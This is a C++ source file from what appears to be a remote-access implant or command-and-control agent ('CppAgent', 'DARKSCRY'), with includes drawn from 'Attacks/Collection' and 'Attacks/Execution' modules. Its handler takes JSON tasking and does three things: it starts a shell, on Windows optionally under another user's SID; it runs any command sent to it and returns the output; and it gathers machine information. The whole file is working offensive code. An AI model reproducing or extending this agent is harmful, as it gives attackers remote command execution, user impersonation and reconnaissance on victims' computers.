#define NOMINMAX
#include "CommandHandler.h"

#include "Logger/GlobalLogger.h"
#include "serialization/MachineInfoSerializer.h"
#include <rapidjson/writer.h>
#include <rapidjson/stringbuffer.h>

#include "Attacks/Collection/sysinfo.hpp"
#include "Attacks/Execution/Shell.hpp"
#ifdef _WIN32
#include "utils/win32/include/WinUtils.hpp"
#include "utils/win32/include/UserUtils.hpp"
#endif

using namespace CppAgent;
using rapidjson::Document;
using rapidjson::Value;

CommandHandler::CommandHandler()
{
    registry_.emplace(StartShell,          &CommandHandler::onStartShell);
    registry_.emplace(RunCommand,          &CommandHandler::onRunCommand);
    registry_.emplace(GetBasicMachineInfo, &CommandHandler::onGetBasicMachineInfo);
}

std::string CommandHandler::handle(std::string_view reqJson)
{
    Document d;
    if (d.Parse(reqJson.data(), reqJson.size()).HasParseError() || !d.IsObject())
        return makeError("JSON parse error");

    int cmdId{};
    if (!json::getInt(d, "action_id", cmdId) && !json::getInt(d, "action", cmdId))
        return makeError("Missing action_id");
    
    DARKSCRY_LOG("CommandHandler: action_id = " + std::to_string(cmdId), Logger::Level::Debug);

    auto it = registry_.find(cmdId);
    if (it == registry_.end())
        return makeError("Unknown action");

    try {
        return std::invoke(it->second, this, std::cref(d));
    } catch (const std::exception& ex) {
        DARKSCRY_LOG(ex.what(), Logger::Level::Error);
        return makeError(ex.what());
    }
}

std::string CommandHandler::onStartShell(const Document& req)
{
    if (!shell_) shell_ = std::make_unique<execution::Shell>();
#ifdef _WIN32
    std::wstring sid = L"CURRENT_USER";
    const Value* cmd_obj = nullptr;
    if (json::getObject(req, "command", cmd_obj)) {
        std::string user_name;
        if (json::getString(*cmd_obj, "user_name", user_name) && !user_name.empty()) {
            std::wstring wname = win32::charToWchar(user_name.c_str());
            std::wstring tmp = win32::user::get_sid_by_user_name(wname);
            if (!tmp.empty()) sid = std::move(tmp);
        }
        std::string sid_str;
        if (json::getString(*cmd_obj, "sid", sid_str) && !sid_str.empty()) {
            sid = win32::charToWchar(sid_str.c_str());
        }
    }

    if (shellRunning_) {
        if (_wcsicmp(shell_->get_current_sid().c_str(), sid.c_str()) == 0)
            return makeSuccess(Value(rapidjson::kNullType));

        shell_->stop();
        shellRunning_ = false;
    }

    shellRunning_ = shell_->create_by_sid(sid);
    if (shellRunning_) current_sid_ = sid;
#else
    if (!shellRunning_)
        shellRunning_ = shell_->create();
#endif
    return shellRunning_ ? makeSuccess(Value(rapidjson::kNullType))
                         : makeError("Shell start failed");
}

std::string CommandHandler::onRunCommand(const Document& req)
{
    if (!shellRunning_)
        return makeError("Shell not running");

    std::string cmd;
    if (!json::getString(req, "command", cmd) || cmd.empty())
        return makeError("Missing or empty command");

    std::string out = shell_->run_command(cmd);
    Document d; d.SetObject();
    d.AddMember("output", Value(out.c_str(), d.GetAllocator()), d.GetAllocator());
    return makeSuccess(d);
}

std::string CommandHandler::onGetBasicMachineInfo(const Document&)
{
    auto info = sysinfo::get_basic_machine_info();

    Document tmp; tmp.SetObject();
    tmp.AddMember("machine_info", serialization::toJson(info, tmp.GetAllocator()), tmp.GetAllocator());
    return makeSuccess(tmp["machine_info"]);
}

std::string CommandHandler::makeSuccess(const Value& data)
{
    Document d; d.SetObject();
    auto& a = d.GetAllocator();
    d.AddMember("success", true, a);
    d.AddMember("data",    Value(data, a), a);
    d.AddMember("error",   Value(rapidjson::kNullType), a);

    rapidjson::StringBuffer buf;
    rapidjson::Writer<rapidjson::StringBuffer> wr(buf);
    d.Accept(wr);
    return buf.GetString();
}

std::string CommandHandler::makeError(const char* msg)
{
    Document d; d.SetObject();
    auto& a = d.GetAllocator();
    d.AddMember("success", false, a);
    d.AddMember("data",    Value(rapidjson::kNullType), a);
    d.AddMember("error",   Value(msg, a), a);

    rapidjson::StringBuffer buf;
    rapidjson::Writer<rapidjson::StringBuffer> wr(buf);
    d.Accept(wr);
    return buf.GetString();
}
